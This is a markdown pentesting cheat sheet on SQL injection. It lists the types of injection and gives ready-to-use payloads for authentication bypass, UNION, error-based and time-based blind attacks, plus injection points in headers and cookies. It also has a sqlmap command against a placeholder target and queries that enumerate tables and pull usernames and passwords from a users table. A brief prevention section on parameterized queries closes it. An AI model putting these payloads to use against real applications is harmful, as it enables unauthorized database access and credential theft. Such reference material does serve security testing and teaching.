# SQL Injection

## Overview
SQL injection is a code injection technique that exploits security vulnerabilities in an application's database layer.

## Types of SQL Injection

### In-Band SQLi
- Error-based
- Union-based

### Inferential SQLi
- Boolean-based blind
- Time-based blind

### Out-of-Band SQLi
- DNS lookup
- HTTP request

## Basic Payloads

### Authentication Bypass
```sql
' OR '1'='1
' OR 1=1 --
' OR '1'='1' --
admin' --
```

### Union Injection
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT table_name FROM information_schema.tables--
```

### Error-Based
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--
```

### Time-Based Blind
```sql
' AND SLEEP(5)--
' AND BENCHMARK(5000000,MD5('test'))--
```

## Finding Vulnerable Parameters

### Manual Testing
```
http://target.com/page.php?id=1'
http://target.com/page.php?id=1 AND 1=1
http://target.com/page.php?id=1 AND 1=2
```

### Automated Testing
```bash
sqlmap -u "http://target.com/page.php?id=1"
```

## Common Injection Points

### GET Parameters
```
/page.php?id=1
/search?q=test
/product?id=5
```

### POST Parameters
```
username=admin&password=test
data={"id": 1}
```

### Headers
```
X-Forwarded-For: ' OR 1=1--
Cookie: id=' OR 1=1--
```

## Exploitation Techniques

### Database Enumeration
```sql
SELECT version()
SELECT user()
SELECT database()
```

### Table Enumeration
```sql
SELECT table_name FROM information_schema.tables
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

### Data Extraction
```sql
SELECT username, password FROM users
SELECT GROUP_CONCAT(username,0x3a,password) FROM users
```

## Prevention

### Parameterized Queries
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
```

### Input Validation
- Whitelist allowed characters
- Escape special characters
- Use type casting

### Least Privilege
- Use limited database accounts
- Restrict stored procedures

## Tags
 #pentesting #security
